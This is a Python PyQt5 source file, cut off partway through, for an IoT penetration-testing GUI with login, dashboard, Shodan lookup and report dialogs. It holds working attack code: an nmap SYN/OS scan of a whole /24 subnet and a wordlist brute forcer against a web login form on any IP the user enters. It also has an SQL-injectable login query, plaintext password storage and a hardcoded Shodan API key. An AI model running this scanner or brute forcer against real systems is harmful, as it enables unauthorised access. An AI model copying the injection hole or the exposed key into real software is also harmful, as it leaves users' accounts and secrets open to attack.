import os
import sqlite3
from PyQt5 import QtCore, QtGui, QtWidgets  
from PyQt5.QtWidgets import QMessageBox
from db_utils import db_connect
import subprocess
# import wifibroot as wb
import csv
import time
import argparse
import threading
import re
import requests
import json
import socket
import nmap
from tabulate import tabulate
from bs4 import BeautifulSoup
import webbrowser
from fpdf import FPDF
from datetime import datetime






DB_PATH = os.path.join(os.path.dirname(__file__), 'db.dat')
dbConn = sqlite3.connect(DB_PATH)
cur = dbConn.cursor()
user_sql = """CREATE TABLE IF NOT EXISTS users (
		id integer PRIMARY KEY,
		username text NOT NULL,
		password text NOT NULL)"""
cur.execute(user_sql)

progress = True

class Ui_Login(QtWidgets.QDialog):  
	def __init__(self, parent=None):
		super(Ui_Login, self).__init__(parent)
		self.setupUi()

	def setupUi(self):
		self.resize(812, 632)
		self.setObjectName("Login")  
		self.setStyleSheet("#Login{background-color: rgb(0, 170, 255);}#frame{background-image: url(background.jpg);}")  
		self.frame = QtWidgets.QFrame(self)  
		self.frame.setGeometry(QtCore.QRect(0, 0, 812, 632))  
		self.frame.setFrameShape(QtWidgets.QFrame.StyledPanel)  
		self.frame.setFrameShadow(QtWidgets.QFrame.Raised)  
		self.frame.setObjectName("frame")
		self.label = QtWidgets.QLabel(self.frame)
		pixLogo = QtGui.QPixmap("logo.jpg")
		pixLogo = pixLogo.scaled(200,200)
		self.label.setPixmap(pixLogo)  
		self.label.setGeometry(QtCore.QRect(280, 10, 200, 200))
		# self.label.setStyleSheet("background: url(logo.jpg);")  
		self.label.setObjectName("label")  
		self.lblUserName = QtWidgets.QLabel(self.frame)  
		self.lblUserName.setGeometry(QtCore.QRect(190, 250, 121, 31))
		self.lblUserName.setObjectName("label_2")  
		self.lblPassword = QtWidgets.QLabel(self.frame)  
		self.lblPassword.setGeometry(QtCore.QRect(190, 300, 121, 21))
		self.lblPassword.setObjectName("label_3")  
		self.edtUserName = QtWidgets.QLineEdit(self.frame)  
		self.edtUserName.setGeometry(QtCore.QRect(300, 250, 231, 31))  
		self.edtUserName.setStyleSheet("background-color: rgb(209, 207, 255);color:black;")  
		self.edtUserName.setObjectName("lineEdit")  
		self.edtPassword = QtWidgets.QLineEdit(self.frame)  
		self.edtPassword.setGeometry(QtCore.QRect(300, 300, 231, 31))  
		self.edtPassword.setStyleSheet("background-color:#d1cfff;color:black;")  
		self.edtPassword.setEchoMode(QtWidgets.QLineEdit.Password)  
		self.edtPassword.setObjectName("edtPassword")  
		self.btnLogin = QtWidgets.QPushButton(self.frame)  
		self.btnLogin.setGeometry(QtCore.QRect(350, 360, 161, 41))  
		font = QtGui.QFont()  
		font.setPointSize(14)  
		self.btnLogin.setFont(font)  
		self.btnLogin.setStyleSheet("background-color: rgb(0, 170, 0);")  
		self.btnLogin.setObjectName("btnLogin")
		self.btnLogin.clicked.connect(self.handleLogin)  
		self.btnSignUp = QtWidgets.QPushButton(self.frame)  
		self.btnSignUp.setGeometry(QtCore.QRect(220, 360, 101, 41))  
		self.btnSignUp.setStyleSheet("background-color:#ffff7f;font-weight:bold;font-size: 14px;")  
		self.btnSignUp.setObjectName("btnSignUp")  
		self.btnSignUp.clicked.connect(self.handleSignUp)
  
		self.retranslateUi()  
		QtCore.QMetaObject.connectSlotsByName(self)  
  
	def retranslateUi(self):  
		_translate = QtCore.QCoreApplication.translate
		self.lblUserName.setText("Username") 
		self.lblUserName.setStyleSheet("font-weight: bold;font-size: 20px;color: white;") 
		self.lblPassword.setText("Password")
		self.lblPassword.setStyleSheet("font-weight: bold;font-size: 20px;color: white;")  
		self.btnLogin.setText(_translate("Dialog", "Log in"))  
		self.btnSignUp.setText(_translate("Dialog", "Sign up"))  
    
	def handleLogin(self):
		username = self.edtUserName.text()
		password = self.edtPassword.text()
		sql = "select password from users where username='{}'".format(username)
		cur.execute(sql)
		result = cur.fetchone()
		if result :
			realpassword = result[0]
			if password == realpassword :
				self.accept()
			else:
				QMessageBox.warning(self, 'Warning', 'The password is wrong.')
		else:
			QMessageBox.warning(self, 'Warning', 'The user does not exist.')

	def handleSignUp(self):
		SignUp = Ui_SignUp(self)
		SignUp.exec()


class Ui_SignUp(QtWidgets.QDialog):  
	def __init__(self, parent=None):
		super(Ui_SignUp, self).__init__(parent)
		self.setupUi()
	def setupUi(self):  
		self.setObjectName("SignUp")  
		self.resize(812, 632)  
		self.setStyleSheet("#SignUp{background-color: rgb(0, 170, 255);}")  
		self.frame = QtWidgets.QFrame(self)  
		self.frame.setGeometry(QtCore.QRect(80, 20, 652, 502))  
		self.frame.setFrameShape(QtWidgets.QFrame.StyledPanel)  
		self.frame.setFrameShadow(QtWidgets.QFrame.Raised)  
		self.frame.setObjectName("frame")
		self.frame.setStyleSheet("#frame{background-color: #77b9dc;border-radius: 10px;}")  
		self.label = QtWidgets.QLabel(self.frame)
		self.label.setGeometry(QtCore.QRect(0, 0, 652, 40))
		font = QtGui.QFont()  
		font.setPointSize(16)  
		self.label.setFont(font)  
		self.label.setStyleSheet("color: rgb(255, 0, 0);")  
		self.label.setObjectName("label")
		self.label.setText("   Sign Up")
		self.label.setStyleSheet("background-color: #0b1d4b;border-top-left-radius: 10px;border-top-right-radius: 10px;color: white;")

		self.lblUserName = QtWidgets.QLabel(self.frame)  
		self.lblUserName.setGeometry(QtCore.QRect(90, 200, 121, 31))
		self.lblUserName.setObjectName("lblUserName")  
		self.edtUserName = QtWidgets.QLineEdit(self.frame)  
		self.edtUserName.setGeometry(QtCore.QRect(200, 200, 231, 31))  
		self.edtUserName.setStyleSheet("background-color: rgb(209, 207, 255);")  
		self.edtUserName.setObjectName("edtUserName")  

		self.lblPassword = QtWidgets.QLabel(self.frame)  
		self.lblPassword.setGeometry(QtCore.QRect(90, 250, 121, 21))
		self.lblPassword.setObjectName("lblPassword")  
		self.edtPassword = QtWidgets.QLineEdit(self.frame)  
		self.edtPassword.setGeometry(QtCore.QRect(200, 250, 231, 31))  
		self.edtPassword.setStyleSheet("background-color:#d1cfff;")  
		self.edtPassword.setEchoMode(QtWidgets.QLineEdit.Password)  
		self.edtPassword.setObjectName("edtPassword")

		self.lblConfirm = QtWidgets.QLabel(self.frame)  
		self.lblConfirm.setGeometry(QtCore.QRect(90, 300, 121, 21))
		self.lblConfirm.setObjectName("lblConfirm")

		self.edtConfirm = QtWidgets.QLineEdit(self.frame)  
		self.edtConfirm.setGeometry(QtCore.QRect(200, 300, 231, 31))  
		self.edtConfirm.setStyleSheet("background-color:#d1cfff;")  
		self.edtConfirm.setEchoMode(QtWidgets.QLineEdit.Password)  
		self.edtConfirm.setObjectName("edtConfirm")  


		self.btnCancel = QtWidgets.QPushButton(self.frame)  
		self.btnCancel.setGeometry(QtCore.QRect(350, 360, 101, 41))  
		font = QtGui.QFont()  
		font.setPointSize(12)  
		self.btnCancel.setFont(font)  
		self.btnCancel.setStyleSheet("background-color: rgb(0, 170, 0);")  
		self.btnCancel.setObjectName("btnLogin")
		self.btnCancel.clicked.connect(self.handleCancel)  
		self.btnRegister = QtWidgets.QPushButton(self.frame)
		self.btnRegister.setFont(font)  
		self.btnRegister.setGeometry(QtCore.QRect(220, 360, 101, 41))  
		self.btnRegister.setStyleSheet("background-color:#ffff7f;")  
		self.btnRegister.setObjectName("btnRegister")  
		self.btnRegister.clicked.connect(self.handleRegister)
  
		self.retranslateUi()  
		QtCore.QMetaObject.connectSlotsByName(self)  
  
	def retranslateUi(self):  
		_translate = QtCore.QCoreApplication.translate 
		self.lblUserName.setText("Username") 
		self.lblUserName.setStyleSheet("font-weight: bold;font-size: 20px;color: white;") 
		self.lblPassword.setText("Password")
		self.lblPassword.setStyleSheet("font-weight: bold;font-size: 20px;color: white;")
		self.lblConfirm.setText("Confirm")
		self.lblConfirm.setStyleSheet("font-weight: bold;font-size: 20px;color: white;")    
		self.btnCancel.setText(_translate("Dialog", "Cancel"))  
		self.btnRegister.setText(_translate("Dialog", "Register"))  

	def handleCancel(self):
		self.accept()

	def handleRegister(self):
		username = self.edtUserName.text()
		password = self.edtPassword.text()
		confirm = self.edtConfirm.text()
		if username == '' :
			QMessageBox.warning(self,'Warning','Input the username.')
			return
		if password == '' :
			QMessageBox.warning(self,'Warning','Input the password.')
			return
		#Validation username
		cur.execute("SELECT * FROM users WHERE username='{}'".format(username))
		if len(cur.fetchall()) > 0 :
			QMessageBox.warning(self,'Warning','The user exists already.')
			self.edtUserName.clear()
			return
    	#password confirm
		if password != confirm :
			QMessageBox.warning(self,'Warning','Password does not match.')
			self.edtConfirm.clear()
			return

		sql = "INSERT INTO users (username, password) VALUES (?, ?)"
		
		try:
			cur.execute(sql, (username, password))
			try:
    			# commit the statements
				dbConn.commit()
				QMessageBox.information(self,'Information','The user registered successfully.')
			except:
				# rollback all database actions since last commit
				dbConn.rollback()
				raise RuntimeError("an error occurred ...")
		except Exception as e:
			QMessageBox.warning(self,'Warning','Can not register')
			raise e
        
class Dashboard(QtWidgets.QDialog):  
    def __init__(self, parent=None):
        super(Dashboard, self).__init__(parent)
        self.setupUi()
    def setupUi(self):  
        self.setObjectName("Dashboard")  
        self.resize(812, 632)  
        self.setStyleSheet("#Dashboard{background-color: rgb(0, 170, 255);}#frame{background-image: url(background.jpg);}QPushButton{color:black;}")  
        self.frame = QtWidgets.QFrame(self)  
        self.frame.setGeometry(QtCore.QRect(80, 20, 652, 502))  
        self.frame.setFrameShape(QtWidgets.QFrame.StyledPanel)  
        self.frame.setFrameShadow(QtWidgets.QFrame.Raised)  
        self.frame.setObjectName("frame")
        self.frame.setStyleSheet("#frame{background-color: #77b9dc;border-radius: 10px;}")  
        self.label = QtWidgets.QLabel(self.frame)  
        self.label.setGeometry(QtCore.QRect(0, 0, 652, 40))
        font = QtGui.QFont()  
        font.setPointSize(16)  
        self.label.setFont(font)  
        self.label.setStyleSheet("color: rgb(255, 0, 0);")  
        self.label.setObjectName("label")

        font = QtGui.QFont()  
        font.setPointSize(12)
        font.setBold(True)  

        self.label1 = QtWidgets.QLabel(self.frame)
        self.label1.setGeometry(QtCore.QRect(130, 100, 400, 40))
        self.label1.setText("Penelation Testing Tool For Internet Of Things")
        self.label1.setFont(font)
        self.label1.setStyleSheet("color: #213b4a;")

        self.btnPublicAttack = QtWidgets.QPushButton(self.frame)  
        self.btnPublicAttack.setGeometry(QtCore.QRect(100, 200, 200, 50))  
        font = QtGui.QFont()  
        font.setPointSize(14)  
        self.btnPublicAttack.setFont(font)  
        self.btnPublicAttack.setStyleSheet("background-color: white;border: 2px solid #4b6b80;")  
        self.btnPublicAttack.setObjectName("btnPublicAttack")
        self.btnPublicAttack.setText("Public Attack")
        self.btnPublicAttack.clicked.connect(self._publicAttack) 


        #Host Discovery
        self.btnHostDiscovery = QtWidgets.QPushButton(self.frame)  
        self.btnHostDiscovery.setGeometry(QtCore.QRect(350, 200, 200, 50))  
        font = QtGui.QFont()  
        font.setPointSize(14)  
        self.btnHostDiscovery.setFont(font)  
        self.btnHostDiscovery.setStyleSheet("background-color: white;border: 2px solid #4b6b80;")  
        self.btnHostDiscovery.setObjectName("btnHostDiscovery")
        self.btnHostDiscovery.setText("Insider Attack")
        self.btnHostDiscovery.clicked.connect(self.hostdiscover)

      

        self.btnOutSiderAttack = QtWidgets.QPushButton(self.frame)  
        self.btnOutSiderAttack.setGeometry(QtCore.QRect(100, 350, 200, 50))    
        self.btnOutSiderAttack.setFont(font)  
        self.btnOutSiderAttack.setStyleSheet("background-color: white;border: 2px solid #4b6b80;")  
        self.btnOutSiderAttack.setObjectName("btnPublicAttack")
        self.btnOutSiderAttack.setText("Outersider Attack")
        self.btnOutSiderAttack.clicked.connect(self.outsiderAttack) 

        self.btnioT = QtWidgets.QPushButton(self.frame)  
        self.btnioT.setGeometry(QtCore.QRect(350, 350, 200, 50))    
        self.btnioT.setFont(font)  
        self.btnioT.setStyleSheet("background-color: white;border: 2px solid #4b6b80;")  
        self.btnioT.setObjectName("btnPublicAttack")
        self.btnioT.setText("ioT Security\n Recommendation")
        self.btnioT.clicked.connect(self.ioT) 
  
        self.retranslateUi()  
        QtCore.QMetaObject.connectSlotsByName(self)  

   
    def retranslateUi(self):  
        _translate = QtCore.QCoreApplication.translate 
        self.label.setText("   DASHBOARD")
        self.label.setStyleSheet("background-color: #0b1d4b;border-top-left-radius: 10px;border-top-right-radius: 10px;color: white;")
    
    def _publicAttack(self):
        PublicAttackUI = PublicAttack(self)
        PublicAttackUI.exec()

    def insiderAttack(self):
        InsiderAttackUI = InsiderAttack(self)
        InsiderAttackUI.exec()
    
    def outsiderAttack(self):
        OutsiderAttackUI = OutsiderAttack(self)
        OutsiderAttackUI.exec()

    def hostdiscover(self):
        HostDiscoveryUI = HostDiscovery(self)
        HostDiscoveryUI.exec()


    def ioT(self):
        IotReportUI = IotReport(self)
        IotReportUI.exec()

class IotReport(QtWidgets.QDialog):

    def __init__(self, parent=None):
        super(IotReport, self).__init__(parent)
        self.setupUi()

    def setupUi(self):
        self.setObjectName("IotReport")  
        self.resize(812, 632)  
        self.setStyleSheet("#Dashboard{background-color: rgb(0, 170, 255);}")  
        self.frame = QtWidgets.QFrame(self)  
        self.frame.setGeometry(QtCore.QRect(80, 20, 652, 502))  
        self.frame.setFrameShape(QtWidgets.QFrame.StyledPanel)  
        self.frame.setFrameShadow(QtWidgets.QFrame.Raised)  
        self.frame.setObjectName("frame")
        self.frame.setStyleSheet("#frame{background-color: #77b9dc;border-radius: 10px;}")  
        self.label = QtWidgets.QLabel(self.frame)  
        self.label.setGeometry(QtCore.QRect(0, 0, 652, 40))
        font = QtGui.QFont()  
        font.setPointSize(16)  
        self.label.setFont(font)  
        self.label.setStyleSheet("color: rgb(255, 0, 0);")  
        self.label.setObjectName("label")


        self.resultTextBrowser = QtWidgets.QTextBrowser(self.frame)
        self.resultTextBrowser.setGeometry(QtCore.QRect(30, 135, 600, 311))
        self.resultTextBrowser.setObjectName("resultTextBrowser")
        self.resultTextBrowser.setOpenExternalLinks(True)


        self.retranslateUi()
        QtCore.QMetaObject.connectSlotsByName(self)

    def retranslateUi(self):
        _translate = QtCore.QCoreApplication.translate
        self.setWindowTitle(_translate("MainWindow", "MainWindow"))
        self.resultTextBrowser.setPlainText('''The recommendations are:
1.	Designing and developing devices and sensors within the use case context. More specifically, issues like Secure authentication and authorization, encryption and protection from denial of service or compromise need to be considered during the design process.
2.	Protecting data flows between devices, gateways, and home and wide area networks from being intercepted, disrupted or modified. This can be done through normal communication security measures, such as reviewing network vulnerabilities that may lead to denial-of-service attacks.
3.	Keeping gateways and their operating systems protected from unauthorized access and misuse by minimizing unnecessary external ports.
4.	Network servers themselves need to have standard online server levels of security such as secure user sign-up, sign-in, and access control, as well as protection from denial-of-service attacks and Brutefroce attacks.
''')



class HostDiscovery(QtWidgets.QDialog):

    def __init__(self, parent=None):
        super(HostDiscovery, self).__init__(parent)
        self.setupUi()

    def setupUi(self):
        self.setObjectName("HostDiscovery")  
        self.resize(812, 632)  
        self.setStyleSheet("#Dashboard{background-color: rgb(0, 170, 255);}")  
        self.frame = QtWidgets.QFrame(self)  
        self.frame.setGeometry(QtCore.QRect(80, 20, 652, 502))  
        self.frame.setFrameShape(QtWidgets.QFrame.StyledPanel)  
        self.frame.setFrameShadow(QtWidgets.QFrame.Raised)  
        self.frame.setObjectName("frame")
        self.frame.setStyleSheet("#frame{background-color: #77b9dc;border-radius: 10px;}")  
        self.label = QtWidgets.QLabel(self.frame)  
        self.label.setGeometry(QtCore.QRect(0, 0, 652, 40))
        font = QtGui.QFont()  
        font.setPointSize(16)  
        self.label.setFont(font)  
        self.label.setStyleSheet("color: rgb(255, 0, 0);")  
        self.label.setObjectName("label")

        self.label = QtWidgets.QLabel(self.frame)
        self.label.setGeometry(QtCore.QRect(30, 70, 81, 41))
        self.label.setAutoFillBackground(True)
        self.label.setObjectName("label")

        self.ipTextEdit = QtWidgets.QPlainTextEdit(self.frame)
        self.ipTextEdit.setGeometry(QtCore.QRect(120, 70, 211, 51))
        self.ipTextEdit.setAutoFillBackground(True)
        self.ipTextEdit.setPlainText("")
        self.ipTextEdit.setObjectName("ipTextEdit")

        self.startButton = QtWidgets.QPushButton(self.frame)
        self.startButton.setGeometry(QtCore.QRect(190, 460, 91, 31))
        self.startButton.setFont(font)
        self.startButton.setStyleSheet("background-color: #84afd1;border: 2px solid #4b6b80;") 
        self.startButton.setObjectName("startButton")
        self.startButton.clicked.connect(self.getHostinResult)

        
        self.clearButton = QtWidgets.QPushButton(self.frame)
        self.clearButton.setGeometry(QtCore.QRect(330, 460, 91, 31))
        self.clearButton.setFont(font)
        self.clearButton.setStyleSheet("background-color: #84afd1;border: 2px solid #4b6b80;")  
        self.clearButton.setObjectName("clearButton")
        self.clearButton.clicked.connect(self.clearOutput)
        


        self.bruteButton = QtWidgets.QPushButton(self.frame)
        self.bruteButton.setGeometry(QtCore.QRect(345, 70, 91, 61))
        self.bruteButton.setFont(font)
        self.bruteButton.setStyleSheet("background-color: #84afd1;border: 2px solid #4b6b80;")  
        self.bruteButton.setObjectName("bruteButton")
        self.bruteButton.clicked.connect(self.brutePassword)

        self.resultTextBrowser = QtWidgets.QTextBrowser(self.frame)
        self.resultTextBrowser.setGeometry(QtCore.QRect(30, 135, 600, 311))
        self.resultTextBrowser.setObjectName("resultTextBrowser")
        self.resultTextBrowser.setOpenExternalLinks(True)

        self.attackIpTextEdit = QtWidgets.QPlainTextEdit(self.frame)
        self.attackIpTextEdit.setGeometry(QtCore.QRect(440, 70, 211, 51))
        self.attackIpTextEdit.setAutoFillBackground(True)
        self.attackIpTextEdit.setPlainText("")
        self.attackIpTextEdit.setObjectName("attackIpTextEdit")

        self.reportButton = QtWidgets.QPushButton(self.frame)
        self.reportButton.setGeometry(QtCore.QRect(480, 460, 91, 31))
        self.reportButton.setFont(font)
        self.reportButton.setStyleSheet("background-color: #84afd1;border: 2px solid #4b6b80;")  
        self.reportButton.setObjectName("reportButton")
        self.reportButton.clicked.connect(self.reportOutput)


        self.retranslateUi()
        QtCore.QMetaObject.connectSlotsByName(self)

    def retranslateUi(self):
        _translate = QtCore.QCoreApplication.translate
        self.setWindowTitle(_translate("MainWindow", "MainWindow"))
        self.label.setText(_translate("MainWindow", "Default Gateway"))
        self.ipTextEdit.setToolTip(_translate("MainWindow", "Enter Subnet Mask"))
        self.startButton.setText(_translate("MainWindow", "Start"))
        self.clearButton.setText(_translate("MainWindow", "Clear"))
        self.bruteButton.setText(_translate("MainWindow", "Crack"))
        self.attackIpTextEdit.setToolTip(_translate("MainWindow", "Enter Target IP"))
        self.reportButton.setText(_translate("MainWindow", "Report"))



    def reportOutput(self):

        output_string = self.resultTextBrowser.toPlainText()
        pdf_name  = datetime.now().strftime('%Y_%m_%d_%H_%M_%S')+'_report.pdf'

        if(output_string):
            pdf = FPDF()
            pdf.add_page()
            pdf.set_font('Arial', 'B', 16)
            pdf.multi_cell(200, 20, output_string)
            pdf.output(pdf_name, 'F')

        else:
            return()

    def clearOutput(self):
        self.resultTextBrowser.clear()
        pass


    def getHostinResult(self):

        self.resultTextBrowser.clear()

        target_ip = self.ipTextEdit.toPlainText()

        if(not target_ip):
            self.resultTextBrowser.setPlainText("Please Input Valid IP")

        else:


            print(target_ip)

            nm = nmap.PortScanner()
            nm.scan(hosts=target_ip+'/24', arguments='-sS -O')

            output_string = ""
            html_output = ""

            #nomuna_host = ["192.168.12.13", "192.168.47.78", "125.48.69.78", "74.89.65.36"]

            self.resultTextBrowser.append("<h1 style=\"font-size:13pt\">{}<\/h1>".format("Discovered Hosts"))

            host_class_list = []
            for host in nm.all_hosts():

                host_url1 = 'http://'+host+':80'
                host_url2 = 'http://'+host+':8080'

                webbrowser.open(host_url1)
                webbrowser.open(host_url2)
           
                html_output1 = "<h2 style=\"font-size:13pt\">{}<\/h2>".format(host)
                html_output2 = "\n\t <a style=\"font-size:9pt;margin-top:5pt;padding-left:5em;color:#01716D;text-decoration: none;\" href=\"http://{}:{}\">{}:{}</a> \n".format(host, 80, host, 80)
            
                html_output3 = "\n\t <a style=\"font-size:9pt;margin-top:5pt;padding-left:5em;color:#01716D;text-decoration: none;\" href=\"http://{}:{}\">{}:{}</a> \n".format(host, 8080, host, 8080)

                self.resultTextBrowser.append(html_output1)
                self.resultTextBrowser.append(html_output2)
                self.resultTextBrowser.append(html_output3)

            print(html_output)

    def brutePassword(self):

        base_url = self.attackIpTextEdit.toPlainText()

        login_url = "http://"+base_url+"/web/auth.php"

        PASS_FILE = 'password.csv'
        USERNAME_FILE = 'username.csv'

        with open(PASS_FILE) as f:
            pass_list = [line.rstrip() for line in f]

        with open(USERNAME_FILE) as f:
            username_list = [line.rstrip() for line in f]

        try:
            response = requests.get(login_url)
        except:
            self.resultTextBrowser.setPlainText("Recheck The IP")
            return
        
        

        print(response.text)

        user_pass = None

        for username in username_list:
            for password in pass_list:

                is_cracked = False

                post_data = {'username':username, 'password':password}

                print("Attempting {}:{}".format(username, password))
                post_response = requests.post(login_url, data=post_data)
                soup = BeautifulSoup(post_response.content, 'html.parser')
                failed_text = soup.find("div", {"class": "alert alert-warning"})

                self.resultTextBrowser.append("Attempting {}:{}".format(username, password))

                if(not failed_text):
                    self.resultTextBrowser.append("\n")
                    #self.resultTextBrowser.append("Username is: {} and password is: {}".format(username, password))
                    found_text = r"<h3 style=\"background-color:powderblue; color:green>Username is :{} and Password is :{} </h3>".format(username, password)
                    self.resultTextBrowser.append(found_text)

                    return
        not_found_text = r"<h3 style=\"background-color:powderblue; color:green>Id:Pass not found</h3>"
        self.resultTextBrowser.append(not_found_text)

class PublicAttack(QtWidgets.QDialog):

    def __init__(self, parent=None):
        super(PublicAttack, self).__init__(parent)
        self.setupUi()

    def setupUi(self):
        self.setObjectName("PublicAttack")  
        self.resize(812, 632)  
        self.setStyleSheet("#Dashboard{background-color: rgb(0, 170, 255);}")  
        self.frame = QtWidgets.QFrame(self)  
        self.frame.setGeometry(QtCore.QRect(80, 20, 652, 502))  
        self.frame.setFrameShape(QtWidgets.QFrame.StyledPanel)  
        self.frame.setFrameShadow(QtWidgets.QFrame.Raised)  
        self.frame.setObjectName("frame")
        self.frame.setStyleSheet("#frame{background-color: #77b9dc;border-radius: 10px;}")  
        self.label = QtWidgets.QLabel(self.frame)  
        self.label.setGeometry(QtCore.QRect(0, 0, 652, 40))
        font = QtGui.QFont()  
        font.setPointSize(16)  
        self.label.setFont(font)  
        self.label.setStyleSheet("color: rgb(255, 0, 0);")  
        self.label.setObjectName("label")

        self.label = QtWidgets.QLabel(self.frame)
        self.label.setGeometry(QtCore.QRect(50, 70, 85, 41))
        self.label.setAutoFillBackground(True)
        self.label.setObjectName("label")

        self.ipTextEdit = QtWidgets.QPlainTextEdit(self.frame)
        self.ipTextEdit.setGeometry(QtCore.QRect(140, 70, 211, 51))
        self.ipTextEdit.setAutoFillBackground(True)
        self.ipTextEdit.setPlainText("")
        self.ipTextEdit.setObjectName("ipTextEdit")

        

        
        self.clearButton = QtWidgets.QPushButton(self.frame)
        self.clearButton.setGeometry(QtCore.QRect(330, 460, 91, 31))
        self.clearButton.setFont(font)
        self.clearButton.setStyleSheet("background-color: #84afd1;border: 2px solid #4b6b80;")  
        self.clearButton.setObjectName("clearButton")
        self.clearButton.clicked.connect(self.clearOutput)
        


        '''
        self.resultTextEdit = QtWidgets.QPlainTextEdit(self.frame)
        self.resultTextEdit.setGeometry(QtCore.QRect(30, 230, 421, 311))
        self.resultTextEdit.setObjectName("resultTextEdit")

        '''

        self.resultTextBrowser = QtWidgets.QTextBrowser(self.frame)
        self.resultTextBrowser.setGeometry(QtCore.QRect(30, 135, 600, 311))        
        self.resultTextBrowser.setFontPointSize(10)
        self.resultTextBrowser.setFontWeight(6)
        self.resultTextBrowser.setObjectName("resultTextBrowser")
        self.resultTextBrowser.setOpenExternalLinks(True)

        

        self.startButton = QtWidgets.QPushButton(self.frame)
        self.startButton.setGeometry(QtCore.QRect(190, 460, 91, 31))
        self.startButton.setFont(font)
        self.startButton.setStyleSheet("background-color: #84afd1;border: 2px solid #4b6b80;")  
        self.startButton.setObjectName("startButton")
        self.startButton.clicked.connect(self.manipulateUi)

        self.reportButton = QtWidgets.QPushButton(self.frame)
        self.reportButton.setGeometry(QtCore.QRect(480, 460, 91, 31))
        self.reportButton.setFont(font)
        self.reportButton.setStyleSheet("background-color: #84afd1;border: 2px solid #4b6b80;")  
        self.reportButton.setObjectName("reportButton")
        self.reportButton.clicked.connect(self.reportOutput)


        self.retranslateUi()
        QtCore.QMetaObject.connectSlotsByName(self)

    def retranslateUi(self):
        _translate = QtCore.QCoreApplication.translate
        self.setWindowTitle(_translate("MainWindow", "MainWindow"))
        self.label.setText(_translate("MainWindow", "Enter Tareget IP"))
        self.ipTextEdit.setToolTip(_translate("MainWindow", "Enter Target IP"))
        self.startButton.setText(_translate("MainWindow", "Start"))
        self.clearButton.setText(_translate("MainWindow", "Clear"))
        self.reportButton.setText(_translate("MainWindow", "Report"))



    def get_shodan_result(self, ip):

        API_KEY ="4H0L6IEZmCpr2FMQq2EKeFJvcPJrG3L7"
        url = r'https://api.shodan.io/shodan/host/'+ip+'?key='+API_KEY
        response = requests.get(url)
        all_result = json.loads(response.text)
        ip = "null"
        ports = []

        print(type(all_result.get('error')))

        if(all_result.get('error')):
            return ["No information available for that IP.", ports, ip]

        else:


            ip = all_result['ip_str']
            country_code  = all_result['country_code']
            lat = all_result['latitude']       
            lang = all_result['longitude']
            isp = all_result['isp']
            os = all_result['os']
            ports = all_result['ports']


            output_text = """Country Code: {} \n
                             Latitude, Longitude: {}, {} \n
                             ISP : {} \n
                             OS: {} \n
                             Ports: {} \n """.format(country_code, lat, lang, isp, os, ports)

            return [output_text, ports, ip]

    def clearOutput(self):
        self.resultTextBrowser.clear()
        pass

    def manipulateUi(self):
        
        self.resultTextBrowser.clear()

        target_ip = self.ipTextEdit.toPlainText()

        if(not target_ip):
            self.resultTextBrowser.setPlainText("Please Input Valid IP")

        

        else:
            print(target_ip)

            response_text, ports, ip = self.get_shodan_result(target_ip)
            print(type(response_text))
            self.resultTextBrowser.setPlainText(response_text)

            for port in ports:
                print(port)
                host_url = 'http://'+ip+':'+str(port)
                webbrowser.open(host_url)
                try:
                    link_string = "<a style=\"font-size:13pt;margin-top:5pt;padding-left:10pt;color:#01716D;text-decoration: none;\" href=\"http://{}:{}\">{}:{} and service name : {} </a> \n".format(ip, port, ip, port, socket.getservbyport(port))

                except OSError:
                    link_string = "<a style=\"font-size:13pt;margin-top:5pt;padding-left:10pt;color:#0024BA;text-decoration: none\" href=\"http://{}:{}\">{}:{} and service name : Service Name Not Found </a> \n".format(ip, port,ip, port)

                print(link_string)
                self.resultTextBrowser.append(link_string)
    
    def reportOutput(self):

        output_string = self.resultTextBrowser.toPlainText()
        print(output_string)
        pdf_name = datetime.now().strftime('%Y_%m_%d_%H_%M_%S')+'_report.pdf'

        if(output_string):
            pdf = FPDF()
            pdf.add_page()
            pdf.set_font('Arial', 'B', 16)
            pdf.multi_cell(200, 20, output_string)
            pdf.output(pdf_name, 'F')

        else:
            return()


class InsiderAttack(QtWidgets.QDialog):
    def __init__(self, parent=None):
        super(InsiderAttack, self).__init__(parent)
        self.setupUi()
    def setupUi(self):  
        self.setObjectName("InsiderAttack")  
        self.resize(812, 632)  
        self.setStyleSheet("#InsiderAttack{background-color: rgb(0, 170, 255);}")  
        self.frame = QtWidgets.QFrame(self)  
        self.frame.setGeometry(QtCore.QRect(80, 20, 652, 502))  
        self.frame.setFrameShape(QtWidgets.QFrame.StyledPanel)  
        self.frame.setFrameShadow(QtWidgets.QFrame.Raised)  
        self.frame.setObjectName("frame")
        self.frame.setStyleSheet("#frame{background-color: #77b9dc;border-radius: 10px;}")  
        self.label = QtWidgets.QLabel(self.frame)  
        self.label.setGeometry(QtCore.QRect(0, 0, 652, 40))
        font = QtGui.QFont()  
        font.setPointSize(16)  
        self.label.setFont(font)  
        self.label.setStyleSheet("color: rgb(255, 0, 0);")  
        self.label.setObjectName("label")

        self.lblDevice = QtWidgets.QLabel(self.frame)
        self.lblDevice.setGeometry(QtCore.QRect(5, 85, 90, 30))
        self.lblDevice.setText("Target device")
        self.lblDevice.setStyleSheet("color: #81868a;font-size: 12px;")

        self.edtDevice = QtWidgets.QLineEdit(self.frame)
        self.edtDevice.setGeometry(QtCore.QRect(100, 85, 200, 30))
        self.edtDevice.setObjectName("edtDevice")

        font = QtGui.QFont()  
        font.setPointSize(15)  
        self.btnStart = QtWidgets.QPushButton(self.frame)  
        self.btnStart.setGeometry(QtCore.QRect(80, 250, 200, 160))  
        self.btnStart.setFont(font)  
        self.btnStart.setStyleSheet("background-color: #84afd1;border: 2px solid #4b6b80;")  
        self.btnStart.setObjectName("btnStart")
        self.btnStart.setText("Start")
        self.btnStart.clicked.connect(self.start)

        self.btnReport = QtWidgets.QPushButton(self.frame)  
        self.btnReport.setGeometry(QtCore.QRect(400, 250, 200, 160))  
        self.btnReport.setFont(font)
        self.btnReport.setStyleSheet("background-color: #84afd1;border: 2px solid #4b6b80;")  
        self.btnReport.setObjectName("btnReport")
        self.btnReport.setText("Report")
        self.btnReport.clicked.connect(self.report) 

        self.retranslateUi()  
        QtCore.QMetaObject.connectSlotsByName(self)  
  
    def retranslateUi(self):  
        _translate = QtCore.QCoreApplication.translate 
        self.label.setText("   Insider Attack")
        self.label.setStyleSheet("background-color: #0b1d4b;border-top-left-radius: 10px;border-top-right-radius: 10px;color: white;")
    
    def shodan(self):
        self.accept()

    def start(self):
        self.accept()

    def report(self):
        self.accept()

class OutsiderAttack(QtWidgets.QDialog):  
    def __init__(self, parent=None):
        super(OutsiderAttack, self).__init__(parent)
        self.setupUi()

    def setupUi(self):
        self.setObjectName("OutsiderAttack")  
